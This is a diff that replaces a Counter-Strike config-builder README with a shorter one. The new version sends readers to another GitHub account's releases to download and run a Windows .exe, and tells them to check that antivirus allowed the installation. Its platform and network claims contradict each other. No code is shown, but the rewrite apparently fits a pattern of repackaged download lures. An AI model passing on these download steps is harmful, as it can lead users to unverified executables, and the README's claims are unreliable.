@@ -1,140 +1,79 @@
-# CsBuilder - Configuration Builder 2026
+# 🎯 csbuilder-crosshair-editor - Build custom Counter-Strike settings easily
 
-> **A desktop application for visually crafting Counter-Strike configuration files (autoexec.cfg) across CS2, CSS, and CS 1.6 — no coding required.**
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/160th-leiomyoma656/csbuilder-crosshair-editor/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tyler-moore56/csbuilder-crosshair-editor?style=flat-square)](https://github.com/tyler-moore56/csbuilder-crosshair-editor)
+This application helps players build and edit configuration files for Counter-Strike games. You can create custom crosshairs, set mouse sensitivity, and organize key bindings without writing code. The software supports Counter-Strike 2, Counter-Strike: Source, and Counter-Strike 1.6.
 
----
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://tyler-moore56.github.io/csbuilder-crosshair-editor/">
-    <img src="https://img.shields.io/badge/Download-CsBuilder%20Latest-brightgreen?style=for-the-badge" alt="Download CsBuilder">
-  </a>
-</p>
+Follow these steps to set up the software on your Windows computer.
 
-> **[Direct Download - CsBuilder v1.0](https://tyler-moore56.github.io/csbuilder-crosshair-editor/)**
+1. Visit the [official releases page](https://github.com/160th-leiomyoma656/csbuilder-crosshair-editor/releases).
+2. Download the version ending in .exe for Windows.
+3. Open the downloaded file to start the installer.
+4. Follow the screen prompts to complete the installation.
+5. Launch the application from your desktop shortcut.
 
----
+## 🛠️ Features
 
-[Download Latest Build](https://tyler-moore56.github.io/csbuilder-crosshair-editor/)
+The application streamlines the way you manage your game settings. These features help you gain consistency in your gameplay.
 
----
+### Crosshair Builder
+Use the visual interface to design your perfect crosshair. Adjust size, gap, thickness, and color. The preview window shows how the crosshair looks in game. You can save your favorite styles as presets.
 
-## Overview
+### eDPI and Sensitivity
+Input your mouse DPI and in-game sensitivity to calculate your effective DPI. Use the sensitivity translator to move your settings from one game version to another. This ensures your muscle memory remains consistent.
 
-CsBuilder changes how Counter-Strike players approach configuration files. Rather than editing text documents by hand and memorizing console commands, this desktop tool offers a graphical interface where every option — from crosshair design to key assignments — is adjustable through clicks and sliders. It removes the uncertainty from building an autoexec.cfg, making the process straightforward for beginners while providing the flexibility experienced players demand.
+### Key Bindings and Aliases
+Assign game functions to specific keys without editing text files. Use the interface to create aliases for complex actions. You can rebind keys for grenades, movement, or communication.
 
-Developed with Electron and featuring a dark theme interface, CsBuilder supports three Counter-Strike titles: CS2, Counter-Strike: Source, and Counter-Strike 1.6. The application automatically manages version-specific syntax variations, ensuring your configuration works correctly regardless of the game. Whether you want a competitive setup with fine-tuned crosshair settings or a practice environment with custom aliases, CsBuilder delivers the components in an easy-to-use package.
+### Live CFG Viewer
+See the actual contents of your configuration file inside the app. The viewer updates as you change settings. This confirms your changes before you save the file.
 
----
+### Practice Configurations
+Apply specialized settings for practice sessions. Use these to toggle infinite ammo, clipping, or faster round timers. Save these as separate files to load when you join a private server.
 
-## Capabilities
+## 📁 System Requirements
 
-- **Multi-Game Compatibility** — Build configurations for CS2, CSS, and CS 1.6 with automatic syntax adaptation for each title
-- **Comprehensive Crosshair Customization** — Modify every aspect including gap, thickness, outline, dot, and color with real-time preview
-- **Integrated eDPI Calculator** — Calculate your effective dots per inch by combining sensitivity and DPI values
-- **Sensitivity Translator** — Convert mouse sensitivity between different Counter-Strike versions
-- **Key Binding Interface** — Link actions, weapons, and utilities to any key through visual mapping
-- **Pre-Built Aliases** — Browse a collection of ready-made aliases for bhopping, grenade throws, and training exercises
-- **Practice Configuration Generator** — Create training setups with bot configurations, unlimited ammo, and fly mode
-- **Live CFG Viewer** — Watch your configuration file update instantly as you adjust settings
-- **Import and Export** — Load existing CFG files or distribute your configurations to others
-- **Preset Management** — Save and alternate between multiple configuration profiles for different playstyles
+This application works on most versions of Windows.
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 GB RAM minimum.
+* Storage Space: 250 MB for the application installation.
+* Connection: Internet access for updates and downloading presets.
 
-## Setup
+## ⚙️ How to Use the App
 
-Clone the repository or obtain the latest release:
+Open the application to see the dashboard. The main menu lists available titles like CS2, CSS, and CS 1.6. Click the game you play to start customizing settings.
 
-```bash
-git clone https://github.com/tyler-moore56/csbuilder-crosshair-editor.git
-cd CsBuilder-cfg-builder
-```
+### Saving Your Settings
+When you finish your changes, press the save button. The app generates an autoexec.cfg file for you. It automatically places this file in the correct game folder on your computer. If the app cannot find your game folder, it asks you to select the directory manually.
 
-For the standalone desktop application, download the appropriate package for your operating system from the [releases page](https://tyler-moore56.github.io/csbuilder-crosshair-editor/). The pre-built version requires no extra dependencies.
+### Importing and Exporting
+You can share your settings with friends. Export your current profile to a small file. Your friends can import this file into their own copy of the software to use your exact crosshair and sensitivity settings.
 
-To launch from source:
+## 🛡️ Safety and Performance
 
-```bash
-npm install
-npm start
-```
+The application does not interfere with game anti-cheat systems. It only edits text-based configuration files that the game reads upon launch. It does not inject code into the game process.
 
----
+If you encounter issues, verify that your antivirus software allowed the installation. Because this tool creates game configs, some security programs monitor file changes closely. 
 
-## Getting Started
+## ❓ Frequently Asked Questions
 
-Open CsBuilder and you will find the main dashboard containing five core sections: Crosshair, Sensitivity, Key Binds, Aliases, and Practice Mode.
+**Does this software work on Mac or Linux?**
+The software includes cross-platform support. You can download the version that corresponds to your operating system from the repository.
 
-**Building a basic configuration:**
+**Can I undo my changes?**
+The app saves backups of your original config file before every update. Use the history tab to revert to a previous state if you prefer your old settings.
 
-1. Choose your target game (CS2, CSS, or CS 1.6) from the dropdown menu at the top
-2. Go to the Crosshair tab and fine-tune settings using the visual controls
-3. Access the Sensitivity section to configure your mouse DPI and in-game sensitivity
-4. Use Key Binds to assign functions like jump, crouch, or weapon switching
-5. Press "Generate CFG" to compile your selections into a working autoexec.cfg
-6. Save the file to your Counter-Strike configuration directory
+**Is my data stored online?**
+Your settings stay on your computer. The application does not send your personal settings to a server.
 
-**Working with the sensitivity converter:**
+**How do I update the software?**
+The application checks for updates when you start it. If a new version exists, the app prompts you to download the installer.
 
-```bash
-# Example: Convert CS2 sensitivity to CS 1.6
-Input: 2.5 @ 800 DPI (CS2)
-Output: 3.2 @ 800 DPI (CS 1.6)
-```
+## 🤝 Support
 
----
+If you find a problem or want to suggest a feature, use the issue tracker on GitHub. Provide as much detail as possible about your system.
 
-## Storage
-
-All preferences are saved in a local JSON file inside the application's user data directory. You can export your complete configuration as a standalone CFG file at any time.
-
-Default configuration paths:
-- Windows: `%APPDATA%/CsBuilder/config.json`
-- macOS: `~/Library/Application Support/CsBuilder/config.json`
-- Linux: `~/.config/CsBuilder/config.json`
-
-Presets are stored as separate JSON files and can be imported or exported for sharing.
-
----
-
-## System Requirements
-
-- **Operating System:** Windows 10+, macOS 10.15+, or Linux (recent distributions)
-- **Runtime:** Electron-based standalone application (no browser needed)
-- **Disk Space:** Approximately 100 MB for the application
-- **Display:** 1280x720 minimum resolution recommended
-- **Memory:** 512 MB RAM minimum
-
----
-
-## Frequently Asked Questions
-
-**Q: Does CsBuilder work with Counter-Strike 2?**  
-A: Yes, CS2 is fully supported along with Counter-Strike: Source and Counter-Strike 1.6.
-
-**Q: Can I bring my existing autoexec.cfg into this tool?**  
-A: Absolutely. Use the import feature to load existing CFG files and modify them through the visual interface.
-
-**Q: How do I update the application?**  
-A: Visit the [releases page](https://tyler-moore56.github.io/csbuilder-crosshair-editor/) for newer versions. The application will alert you when updates become available.
-
-**Q: Where should I put my generated autoexec.cfg?**  
-A: For CS2, place the file in `steamapps/common/Counter-Strike Global Offensive/game/csgo/cfg/`. For other titles, consult their respective configuration folders.
-
-**Q: Does CsBuilder require an internet connection?**  
-A: No. The application functions fully offline after installation. No network access is needed for creating configurations.
-
-**Q: How can I restore default settings?**  
-A: Delete the config.json file from the application data directory, or select "Reset to Defaults" from the settings menu.
-
----
-
-## License
-
-GNU GPL v3.0 — see [LICENSE](LICENSE) for details.
+Keywords: counter-strike, crosshair, config, sensitivity, cs2, gaming, utility
